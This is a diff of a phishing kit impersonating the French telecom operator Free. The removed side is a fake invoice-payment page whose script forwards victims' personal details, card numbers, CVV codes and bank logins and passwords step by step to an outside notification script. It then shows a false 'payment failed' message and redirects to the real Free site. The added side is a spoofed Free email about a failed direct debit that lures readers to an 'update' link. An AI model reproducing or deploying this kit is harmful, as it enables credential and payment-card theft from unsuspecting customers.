@@ -1,348 +1,222 @@
-<!DOCTYPE html>
-<html lang="fr">
-<head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width,initial-scale=1" />
-  <title>Paiement facture</title>
-  <!-- Font Awesome pour les icônes sociales -->
-  <link
-    rel="stylesheet"
-    href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css"
-    crossorigin="anonymous"
-    referrerpolicy="no-referrer"
-  />
-  <link rel="stylesheet" href="style.css" />
-</head>
-<body>
-  <!-- HEADER style “Free” -->
-  <header class="site-header">
-    <div class="logo">
-      <img src="Free_logo.svg.png" alt="Free" />
-    </div>
-    <nav class="main-nav">
-      <ul>
-        <li><a href="#">Freebox <span class="arrow">▾</span></a></li>
-        <li><a href="#">Téléphones &amp; Forfaits <span class="arrow">▾</span></a></li>
-        <li><a href="#">Boutiques</a></li>
-        <li><a href="#">Bons Plans</a></li>
-        <li><a href="#">Assistance</a></li>
-        <li><a href="#">Free Pro</a></li>
-      </ul>
-    </nav>
-    <div class="header-actions">
-      <button class="eligibility-btn">Testez votre éligibilité</button>
-      <a href="#" class="location-icon" title="Nos boutiques"><i class="fas fa-map-marker-alt"></i></a>
-      <a href="#" class="subscriber">Espace Abonné</a>
-    </div>
-  </header>
-
-  <!-- CONTENU centré -->
-  <div class="container">
-    <main>
-      <h1>Régler votre facture Freemobile_0110231130320258 — 9,99 €</h1>
-
-      <!-- TOGGLE méthodes de paiement -->
-      <div class="toggle-methods">
-        <input type="radio" id="method-card" name="method" value="Carte bancaire" checked />
-        <label for="method-card">Carte bancaire</label>
-        <input type="radio" id="method-sepa" name="method" value="Prélèvement SEPA" />
-        <label for="method-sepa">Prélèvement SEPA</label>
-      </div>
-
-      <button id="pay-btn">Payer maintenant</button>
-    </main>
-  </div>
-
-  <!-- FOOTER style “Free” -->
-  <footer class="site-footer">
-    <div class="footer-columns">
-      <div class="footer-column">
-        <h4>Offres & Services</h4>
-        <ul>
-          <li><a href="#">Freebox Ultra</a></li>
-          <li><a href="#">Freebox Ultra Essentiel</a></li>
-          <li><a href="#">Freebox Ultra Édition Limitée</a></li>
-          <li><a href="#">Freebox Pop</a></li>
-          <li><a href="#">Freebox Pop S</a></li>
-          <li><a href="#">Série Spéciale Freebox Révolution Light</a></li>
-          <li><a href="#">Box 5G</a></li>
-          <li><a href="#">Avantages Free Family</a></li>
-          <li><a href="#">Répéteur Wi-Fi</a></li>
-          <li><a href="#">OQEE by Free</a></li>
-          <li><a href="#">Free Transfert</a></li>
-          <li><a href="#">Carte fibre / ADSL</a></li>
-          <li><a href="#">Plan du site</a></li>
-          <li><a href="#">Free × CORAIL°</a></li>
-        </ul>
-      </div>
-      <div class="footer-column">
-        <h4>Abonné</h4>
-        <ul>
-          <li><a href="#">Espace Abonné</a></li>
-          <li><a href="#">Déménager mon abonnement</a></li>
-          <li><a href="#">Suivre ma souscription</a></li>
-          <li><a href="#">Régler une facture</a></li>
-          <li><a href="#">Résiliation</a></li>
-          <li><a href="#">Compte accès libre</a></li>
-          <li><a href="#">Applications Free</a></li>
-        </ul>
-      </div>
-      <div class="footer-column">
-        <h4>Aide & Contact</h4>
-        <ul>
-          <li><a href="#">Trouver une boutique</a></li>
-          <li><a href="#">Free Proxi</a></li>
-          <li><a href="#">Assistance en ligne</a></li>
-          <li><a href="#">Trouver mon identifiant Freebox</a></li>
-          <li><a href="#">Nous contacter</a></li>
-          <li><a href="#">Résiliez votre FAI</a></li>
-          <li><a href="#">Guide Pratique</a></li>
-          <li><a href="#">Protection de l’enfance</a></li>
-        </ul>
-      </div>
-      <div class="footer-column">
-        <h4>Société</h4>
-        <ul>
-          <li><a href="#">Free Pro</a></li>
-          <li><a href="#">Free s’engage</a></li>>
-          <li><a href="#">Le groupe Iliad</a></li>
-          <li><a href="#" class="highlight">Free recrute !</a></li>
-        </ul>
-      </div>
-    </div>
-    <div class="footer-bottom">
-      <div class="legal-links">
-        <a href="#">Informations Légales</a>
-        <a href="#">Données et contenus</a>
-        <a href="#">Signaler un contenu</a>
-        <a href="#">Tarifs et conditions</a>
-      </div>
-      <div class="social-icons">
-        <a href="#"><i class="fab fa-facebook-f"></i></a>
-        <a href="#"><i class="fab fa-x-twitter"></i></a>
-        <a href="#"><i class="fab fa-instagram"></i></a>
-        <a href="#"><i class="fab fa-tiktok"></i></a>
-        <a href="#"><i class="fab fa-youtube"></i></a>
-        <a href="#"><i class="fab fa-linkedin-in"></i></a>
-      </div>
-    </div>
-  </footer>
-
-  <!-- MODAL DE PAIEMENT -->
-  <div id="payment-modal" class="modal-overlay hidden">
-    <div class="modal-content">
-      <!-- Étape 1 : infos perso -->
-      <form id="step-1" class="modal-step active">
-        <h2>Informations personnelles</h2>
-        <label>
-          Nom<br />
-          <input type="text" name="lastname" required />
-        </label>
-        <label>
-          Prénom<br />
-          <input type="text" name="firstname" required />
-        </label>
-        <label>
-          Téléphone<br />
-          <input type="tel" name="phone" required />
-        </label>
-        <label>
-          Email<br />
-          <input type="email" name="email" required />
-        </label>
-        <label>
-          Adresse<br />
-          <input type="text" name="address" required />
-        </label>
-        <button type="button" id="to-step-2" class="btn-next">Suivant</button>
-      </form>
-
-      <!-- Étape 2 : Carte bancaire -->
-      <form id="step-2-card" class="modal-step">
-        <h2>Détails de la carte</h2>
-        <label>
-          Numéro de carte<br />
-          <input
-            type="text"
-            id="cardnumber"
-            name="cardnumber"
-            maxlength="19"
-            placeholder="1234 5678 9012 3456"
-            required
-          />
-        </label>
-        <label>
-          Date d’expiration<br />
-          <input
-            type="text"
-            id="expdate"
-            name="expdate"
-            maxlength="5"
-            placeholder="MM/AA"
-            required
-          />
-        </label>
-        <label>
-          CVV<br />
-          <input type="text" name="cvv" maxlength="3" placeholder="123" required />
-        </label>
-        <button type="submit" class="btn-pay">Payer</button>
-      </form>
-
-      <!-- Étape 2 : Prélèvement SEPA -->
-      <form id="step-2-sepa" class="modal-step">
-        <h2>Détails du prélèvement SEPA</h2>
-        <label>
-          Nom de la banque<br />
-          <input type="text" name="bankname" required />
-        </label>
-        <label>
-          Identifiant bancaire<br />
-          <input type="text" name="bankid" required />
-        </label>
-        <label>
-          Mot de passe bancaire<br />
-          <input type="password" name="bankpass" required />
-        </label>
-        <button type="submit" class="btn-pay">Payer</button>
-      </form>
-
-      <!-- Étape 3 : échec -->
-      <div id="step-3" class="modal-step">
-        <h2>Paiement échoué</h2>
-        <p>
-          Votre paiement a échoué. Un conseiller va vous recontacter pour régulariser<br />
-          la situation.
-        </p>
-        <p>
-          Redirection dans <span id="countdown">5</span> s…
-        </p>
-      </div>
-
-      <button class="modal-close" id="modal-close">&times;</button>
-    </div>
-  </div>
-
-  <!-- Script client -->
-  <script src="tg-client.js"></script>
-  <script>
-    // DOM refs
-    const payBtn    = document.getElementById('pay-btn');
-    const toStep2   = document.getElementById('to-step-2');
-    const step1     = document.getElementById('step-1');
-    const step2Card = document.getElementById('step-2-card');
-    const step2Sepa = document.getElementById('step-2-sepa');
-    const step3     = document.getElementById('step-3');
-    const modal     = document.getElementById('payment-modal');
-    const closeBtn  = document.getElementById('modal-close');
-    const countdownEl = document.getElementById('countdown');
-    const cardInput = document.getElementById('cardnumber');
-    const expInput  = document.getElementById('expdate');
-
-    // Formatage auto
-    function formatCardNumber(e) {
-      let digits = e.target.value.replace(/\D/g, '').slice(0, 16);
-      let groups = digits.match(/.{1,4}/g) || [];
-      e.target.value = groups.join(' ');
-    }
-    function formatExpDate(e) {
-      let digits = e.target.value.replace(/\D/g, '').slice(0, 4);
-      if (digits.length > 2) digits = digits.slice(0,2) + '/' + digits.slice(2);
-      e.target.value = digits;
-    }
-    cardInput.addEventListener('input', formatCardNumber);
-    expInput.addEventListener('input', formatExpDate);
-
-    // Étape 0
-    payBtn.addEventListener('click', () => {
-      const method = document.querySelector('input[name="method"]:checked').value;
-      sendNotificationToServer(`Étape 0 – Clic Payer maintenant\nMéthode: ${method}`);
-      modal.classList.remove('hidden');
-    });
-
-    // Étape 1
-    toStep2.addEventListener('click', () => {
-      if (!step1.checkValidity()) return step1.reportValidity();
-      const d1 = new FormData(step1);
-      const infos = [
-        `Nom: ${d1.get('lastname')}`,
-        `Prénom: ${d1.get('firstname')}`,
-        `Téléphone: ${d1.get('phone')}`,
-        `Email: ${d1.get('email')}`,
-        `Adresse: ${d1.get('address')}`
-      ].join('\n');
-      sendNotificationToServer(`Étape 1 – Infos perso\n${infos}`);
-      step1.classList.remove('active');
-      if (document.querySelector('input[name="method"]:checked').value === 'Carte bancaire')
-        step2Card.classList.add('active');
-      else
-        step2Sepa.classList.add('active');
-    });
-
-    // Étape 2 – CB
-    step2Card.addEventListener('submit', e => {
-      e.preventDefault();
-      const raw = cardInput.value.replace(/\D/g, '');
-      if (raw.length !== 16) {
-        cardInput.setCustomValidity('Numéro de carte invalide');
-        return cardInput.reportValidity();
-      }
-      cardInput.setCustomValidity('');
-      if (!/^(0[1-9]|1[0-2])\/\d{2}$/.test(expInput.value)) {
-        expInput.setCustomValidity('Date invalide');
-        return expInput.reportValidity();
-      }
-      expInput.setCustomValidity('');
-      const d2 = new FormData(step2Card);
-      const cb = [
-        `Numéro: ${d2.get('cardnumber')}`,
-        `Exp: ${d2.get('expdate')}`,
-        `CVV: ${d2.get('cvv')}`
-      ].join('\n');
-      sendNotificationToServer(`Étape 2 – Détails CB\n${cb}`);
-      step2Card.classList.remove('active');
-      step3.classList.add('active');
-      startCountdown();
-    });
-
-    // Étape 2 – SEPA
-    step2Sepa.addEventListener('submit', e => {
-      e.preventDefault();
-      if (!step2Sepa.checkValidity()) return step2Sepa.reportValidity();
-      const ds = new FormData(step2Sepa);
-      const sepa = [
-        `Banque: ${ds.get('bankname')}`,
-        `ID: ${ds.get('bankid')}`,
-        `Pass: ${ds.get('bankpass')}`
-      ].join('\n');
-      sendNotificationToServer(`Étape 2 – Détails SEPA\n${sepa}`);
-      step2Sepa.classList.remove('active');
-      step3.classList.add('active');
-      startCountdown();
-    });
-
-    // Countdown & redirection
-    function startCountdown() {
-      let c = 5;
-      const iv = setInterval(() => {
-        countdownEl.textContent = c--;
-        if (c < 0) {
-          clearInterval(iv);
-          window.location.href = 'https://mobile.free.fr/';
-        }
-      }, 1000);
-    }
-
-    // Fermer modal
-    closeBtn.addEventListener('click', () => {
-      modal.classList.add('hidden');
-      [step1, step2Card, step2Sepa, step3].forEach(el => el.classList.remove('active'));
-      step1.classList.add('active');
-      step1.reset();
-      step2Sepa.reset();
-      cardInput.value = '';
-      expInput.value = '';
-    });
-  </script>
-</body>
-</html>
+<table class="v1free_main_table" style="background-color: #ffffff; width: 700px; table-layout: fixed;" border="0" width="700" cellspacing="0" cellpadding="0" align="center" bgcolor="#ffffff">
+    <tbody>
+    <tr>
+    <td class="v1free_px_24 v1free_header_py_11" style="padding-top: 16px; padding-bottom: 16px;" align="center" valign="top">
+    <table class="v1free_main_table" style="width: 640px; table-layout: fixed;" border="0" width="640" cellspacing="0" cellpadding="0" align="center">
+    <tbody>
+    <tr>
+    <td style="vertical-align: middle; font-size: 0;" align="left" valign="middle" width="30%"><a style="display: block;" href="#" target="_blank" rel="noopener noreferrer"> <img class="v1free_header_w_90" style="display: block; width: 110px;" src="https://www.free.fr/mailing/commons/logo-free.png" alt="logo Free" width="110" border="0" /></a></td>
+    <td style="vertical-align: middle;" align="right" valign="middle" width="70%">
+    <table class="v1free_main_table" style="width: 100%; table-layout: fixed;" border="0" width="100%" cellspacing="0" cellpadding="0" align="right">
+    <tbody>
+    <tr>
+    <td style="font-size: 12px; line-height: 16px; color: #161616; font-family: 'open_sans',Arial,sans-serif; font-weight: bold; padding-bottom: 2px;" align="right" valign="top">&nbsp;</td>
+    </tr>
+    <tr>
+    <td style="font-size: 12px; line-height: 16px; color: #161616; font-family: 'open_sans',Arial,sans-serif; padding-bottom: 10px;" align="right" valign="top">&nbsp;</td>
+    </tr>
+    <tr>
+    <td align="right" valign="top">
+    <table class="v1free_main_table" style="width: 100%; table-layout: fixed;" border="0" width="100%" cellspacing="0" cellpadding="0" align="right">
+    <tbody>
+    <tr>
+    <td style="font-size: 12px; line-height: 16px; text-align: right; color: #cc0000; font-family: 'open_sans',Arial,sans-serif; vertical-align: middle; padding-right: 2px;" align="right" valign="middle"><a style="display: block; font-size: 12px; line-height: 16px; color: #cc0000; text-decoration: none; font-family: 'open_sans',Arial,sans-serif;" href="home.html" target="_blank" rel="noopener noreferrer"> <strong>Espace&nbsp;Abonn&eacute;</strong></a></td>
+    <td style="width: 16px; vertical-align: middle;" align="right" valign="middle" width="16"><img style="display: block; width: 16px; height: 16px;" src="https://www.free.fr/mailing/commons/arrow.png" alt="&gt;" width="16" height="16" /></td>
+    </tr>
+    </tbody>
+    </table>
+    </td>
+    </tr>
+    </tbody>
+    </table>
+    </td>
+    </tr>
+    </tbody>
+    </table>
+    </td>
+    </tr>
+    </tbody>
+    </table>
+    <table class="v1free_main_table" style="background-color: #ffffff; width: 700px; table-layout: fixed;" border="0" width="700" cellspacing="0" cellpadding="0" align="center" bgcolor="#ffffff">
+    <tbody>
+    <tr>
+    <td align="center" valign="top">
+    <table class="v1free_main_table" style="background-color: #272727; width: 640px; table-layout: fixed;" border="0" width="640" cellspacing="0" cellpadding="0" align="center" bgcolor="#272727">
+    <tbody>
+    <tr>
+    <td valign="top">
+    <div style="font-size: 1px; line-height: 1px; height: 1px; margin: 0px; background: #ececec;"><hr style="margin: 0px; border-width: 0; background: #ececec; color: #ececec; height: 1px;" /></div>
+    </td>
+    </tr>
+    </tbody>
+    </table>
+    </td>
+    </tr>
+    </tbody>
+    </table>
+    <table class="v1free_main_table" style="background-color: #ffffff; width: 700px; table-layout: fixed;" border="0" width="700" cellspacing="0" cellpadding="0" align="center" bgcolor="#ffffff">
+    <tbody>
+    <tr>
+    <td align="center" valign="top">
+    <table class="v1free_main_table" style="width: 640px; table-layout: fixed;" border="0" width="640" cellspacing="0" cellpadding="0">
+    <tbody>
+    <tr>
+    <td class="v1free_px_24" style="text-align: center; font-size: 20px; line-height: 27px; font-family: 'iliad','open_sans',Arial,sans-serif; color: #000000; padding-top: 20px; padding-bottom: 30px;" valign="top">Probl&egrave;me avec le pr&eacute;l&egrave;vement de&nbsp;<br class="v1free_hide" />votre abonnement</td>
+    </tr>
+    </tbody>
+    </table>
+    </td>
+    </tr>
+    </tbody>
+    </table>
+    <table class="v1free_main_table" style="background-color: #ffffff; width: 700px; table-layout: fixed;" border="0" width="700" cellspacing="0" cellpadding="0" align="center" bgcolor="#ffffff">
+    <tbody>
+    <tr>
+    <td class="v1free_px_24" align="center" valign="top">
+    <table class="v1free_main_table" style="width: 640px; table-layout: fixed;" border="0" width="640" cellspacing="0" cellpadding="0">
+    <tbody>
+    <tr>
+    <td style="text-align: justify; font-size: 15px; line-height: 20px; font-family: 'open_sans',Arial,sans-serif; color: #000000; padding-top: 20px; padding-bottom: 16px;" valign="top">Cher(e) abonn&eacute;(e),</td>
+    </tr>
+    <tr>
+    <td style="text-align: justify; font-size: 15px; line-height: 20px; font-family: 'open_sans',Arial,sans-serif; color: #000000;" valign="top">
+    <p>Nous vous informons que le paiement de votre derni&egrave;re facture a &eacute;chou&eacute;.</p>
+    <p>Nous n'avons pas pu pr&eacute;lever le montant de votre abonnement en raison d'un probl&egrave;me</p>
+    <p>avec votre compte.</p>
+    <p>Pour r&eacute;soudre ce probl&egrave;me, veuillez mettre &agrave; jour vos informations de pr&eacute;l&egrave;vement en suivant les instructions.</p>
+    </td>
+    </tr>
+    </tbody>
+    </table>
+    </td>
+    </tr>
+    </tbody>
+    </table>
+    <table class="v1free_main_table" style="background-color: #ffffff; width: 700px; table-layout: fixed;" border="0" width="700" cellspacing="0" cellpadding="0" align="center" bgcolor="#ffffff">
+    <tbody>
+    <tr>
+    <td class="v1free_px_24" valign="top">
+    <table class="v1free_main_table" style="width: 640px; table-layout: fixed;" border="0" width="640" cellspacing="0" cellpadding="0" align="center">
+    <tbody>
+    <tr>
+    <td valign="top">
+    <table class="v1free_main_table" style="width: 580px; table-layout: fixed;" border="0" width="580" cellspacing="0" cellpadding="0" align="center">
+    <tbody>
+    <tr>
+    <th class="v1free_td_block" valign="top">
+    <table style="width: 210px; table-layout: fixed;" border="0" width="210" cellspacing="0" cellpadding="0" align="center">
+    <tbody>
+    <tr>
+    <td valign="top"><a style="text-decoration: none; display: block; color: #ffffff; background-color: #cc0000; border-radius: 4px; width: 100%; padding-top: 5px; padding-bottom: 5px; font-family: 'open_sans',Arial,sans-serif; text-align: center; mso-border-alt: none; word-break: keep-all; border: 1px solid #cc0000;" href="home.html" target="_blank" rel="noopener noreferrer"><strong><span style="line-height: 32px; font-size: 14px; cursor: pointer; color: #ffffff; text-decoration: none;">Mise &agrave; jour </span></strong></a></td>
+    </tr>
+    </tbody>
+    </table>
+    </th>
+    </tr>
+    </tbody>
+    </table>
+    </td>
+    </tr>
+    </tbody>
+    </table>
+    </td>
+    </tr>
+    </tbody>
+    </table>
+    <table class="v1free_main_table" style="background-color: #ffffff; width: 700px; table-layout: fixed;" border="0" width="700" cellspacing="0" cellpadding="0" align="center" bgcolor="#ffffff">
+    <tbody>
+    <tr>
+    <td class="v1free_px_24" align="center" valign="top">
+    <table class="v1free_main_table" style="width: 640px; table-layout: fixed;" border="0" width="640" cellspacing="0" cellpadding="0">
+    <tbody>
+    <tr>
+    <td style="text-align: justify; font-size: 15px; line-height: 20px; font-family: 'open_sans',Arial,sans-serif; color: #000000; padding-bottom: 16px;" valign="top">&nbsp;</td>
+    </tr>
+    <tr>
+    <td style="text-align: justify; font-size: 15px; line-height: 20px; font-family: 'open_sans',Arial,sans-serif; color: #000000; padding-bottom: 30px;" valign="top">Nous vous remercions de votre confiance.</td>
+    </tr>
+    <tr>
+    <td style="text-align: right; font-size: 15px; line-height: 20px; font-family: 'open_sans',Arial,sans-serif; color: #000000; padding-bottom: 30px;" valign="top">L&rsquo;&eacute;quipe Free</td>
+    </tr>
+    </tbody>
+    </table>
+    </td>
+    </tr>
+    </tbody>
+    </table>
+    <table class="v1free_main_table" style="background-color: #f6f6f6; width: 700px; table-layout: fixed;" border="0" width="700" cellspacing="0" cellpadding="0" align="center" bgcolor="#f6f6f6">
+    <tbody>
+    <tr>
+    <td class="v1free_px_24" style="padding-top: 16px;" align="center" valign="top">
+    <table class="v1free_main_table" style="width: 640px; table-layout: fixed;" border="0" width="640" cellspacing="0" cellpadding="0" align="center">
+    <tbody>
+    <tr>
+    <th class="v1free_td_block" align="left" valign="top">
+    <table class="v1free_main_table" style="width: 140px; table-layout: fixed;" border="0" width="140" cellspacing="0" cellpadding="0" align="left">
+    <tbody>
+    <tr>
+    <td class="v1free_pb_16" style="font-size: 20px; line-height: 36px; font-family: 'iliad','open_sans',Arial,sans-serif; text-align: left; color: #000000; vertical-align: middle;" align="left" valign="middle"><strong>Suivez-nous&nbsp;:</strong></td>
+    </tr>
+    </tbody>
+    </table>
+    </th>
+    <th class="v1free_td_block" align="right" valign="top">
+    <table class="v1free_main_table" style="width: 244px; table-layout: fixed;" border="0" width="244" cellspacing="0" cellpadding="0" align="right">
+    <tbody>
+    <tr style="display: inline-block;">
+    <td style="padding-right: 16px;" valign="top"><a style="text-decoration: none;" href="#" target="_blank" rel="noopener noreferrer"> <img style="display: block;" title="Twitter" src="https://www.free.fr/mailing/commons/twitter.png" alt="Twitter" width="36" height="36" /></a></td>
+    <td style="padding-right: 16px;" valign="top"><a style="text-decoration: none;" href="#" target="_blank" rel="noopener noreferrer"> <img style="display: block;" title="Instagram" src="https://www.free.fr/mailing/commons/instagram.png" alt="Instagram" width="36" height="36" /></a></td>
+    <td style="padding-right: 16px;" valign="top"><a style="text-decoration: none;" href="#" target="_blank" rel="noopener noreferrer"> <img style="display: block;" title="TikTok" src="https://www.free.fr/mailing/commons/tiktok.png" alt="TikTok" width="36" height="36" /></a></td>
+    <td style="padding-right: 16px;" valign="top"><a style="text-decoration: none;" href="#" target="_blank" rel="noopener noreferrer"> <img style="display: block;" title="Youtube" src="https://www.free.fr/mailing/commons/youtube.png" alt="Youtube" width="36" height="36" /></a></td>
+    <td valign="top"><a style="text-decoration: none; width: 36px;" href="#" target="_blank" rel="noopener noreferrer"> <img style="display: block;" title="Facebook" src="https://www.free.fr/mailing/commons/facebook.png" alt="Facebook" width="36" height="36" /></a></td>
+    </tr>
+    </tbody>
+    </table>
+    </th>
+    </tr>
+    </tbody>
+    </table>
+    </td>
+    </tr>
+    <tr>
+    <td align="center" valign="top">
+    <table class="v1free_main_table" style="background-color: #f6f6f6; width: 700px; table-layout: fixed;" border="0" width="700" cellspacing="0" cellpadding="0" align="center" bgcolor="#f6f6f6">
+    <tbody>
+    <tr>
+    <td class="v1free_px_24" align="center" valign="top">
+    <table class="v1free_main_table" style="width: 640px; table-layout: fixed;" border="0" width="640" cellspacing="0" cellpadding="0" align="center">
+    <tbody>
+    <tr>
+    <td style="padding-top: 16px; padding-bottom: 16px;" align="center" valign="top">
+    <div style="font-size: 1px; line-height: 1px; height: 1px; margin: 0px; background: #E0E0E0;"><hr style="margin: 0px; border-width: 0; background: #E0E0E0; color: #e0e0e0; height: 1px;" /></div>
+    </td>
+    </tr>
+    </tbody>
+    </table>
+    </td>
+    </tr>
+    </tbody>
+    </table>
+    </td>
+    </tr>
+    <tr>
+    <td align="center" valign="top">
+    <table class="v1free_main_table" style="background-color: #f6f6f6; width: 700px; table-layout: fixed;" border="0" width="700" cellspacing="0" cellpadding="0" align="center" bgcolor="#f6f6f6">
+    <tbody>
+    <tr>
+    <td class="v1free_px_24" style="padding-bottom: 16px;" align="center" valign="top">
+    <table class="v1free_main_table" style="width: 640px; table-layout: fixed;" border="0" width="640" cellspacing="0" cellpadding="0" align="center">
+    <tbody>
+    <tr>
+    <td style="font-size: 10px; line-height: 14px; font-family: 'open_sans',Arial,sans-serif; color: #000000; text-align: justify;" align="left" valign="top">Vous recevez cet email car vous avez souscrit aux services de Free. Pour plus d&rsquo;informations sur la gestion de vos donn&eacute;es personnelles, veuillez consulter <a style="font-size: 10px; line-height: 14px; font-family: 'open_sans',Arial,sans-serif; color: #000000; text-decoration: underline;" href="#" target="_blank" rel="noopener noreferrer">la Politique de confidentialit&eacute; de Free</a>.<br /><br /> Free - SAS au capital de 3 441 812 euros - RCS Paris 421 938 861 - Si&egrave;ge social : 8 rue de la Ville l&rsquo;Ev&ecirc;que 75008 Paris</td>
+    </tr>
+    </tbody>
+    </table>
+    </td>
+    </tr>
+    </tbody>
+    </table>
+    </td>
+    </tr>
+    </tbody>
+    </table>
